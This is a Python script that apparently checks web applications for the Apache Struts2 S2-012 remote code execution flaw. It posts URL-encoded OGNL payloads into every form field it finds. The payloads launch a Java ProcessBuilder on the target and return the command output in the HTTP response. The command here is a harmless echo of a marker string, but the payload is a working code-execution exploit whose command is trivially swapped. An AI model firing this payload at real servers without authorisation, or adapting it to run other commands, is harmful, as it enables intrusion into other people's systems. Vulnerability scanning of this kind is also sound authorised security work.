import requests
import re
import urllib

def s2_012(url):
    relsult = {
        'name': 'S2-012 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        s = requests.Session()
        response = s.get(url, timeout=3)
        forms = re.findall(r'<form.*</form>', response.text, re.DOTALL)
        for form in forms:
            action = re.findall(r'action="([^"]*)"', form)[0]
            vulurl = urllib.parse.urljoin(url, action)
            inputs = re.findall(r'<input.*>', form)
            first = True
            payload = ''
            for input in inputs:
                try:
                    p = re.findall(r'name=[\'\"]([^\'\"]+)[\'\"]', input)[0]
                    if first:
                        payload += p + '={0}'
                        first = False
                    else:
                        payload += '&' + p + '={0}'
                except:
                    continue
            flag = 'tgs72j23u8933j3rxben1'
            basic_payload1 = r'%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C+%22tgs72j23u8933j3rxben1%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D'
            basic_payload2 = r'%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22tgs72j23u8933j3rxben1%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D'
            payload1 = payload.format(basic_payload1)
            payload2 = payload.format(basic_payload2)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            req1 = s.post(vulurl, data=payload1, headers=headers, timeout=3)
            req2 = s.post(vulurl, data=payload2, headers=headers, timeout=3)
            if re.search(flag, req1.text):
                if re.search(flag, req2.text) and len(req2.text) < len(req1.text):
                    pass
                else:
                    relsult['vulnerable'] = True
                    relsult['method'] = 'POST'
                    relsult['url'] = vulurl
                    relsult['position'] = 'data'
                    relsult['payload'] = payload1
        return relsult
    except:
        return relsult

if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_012(url))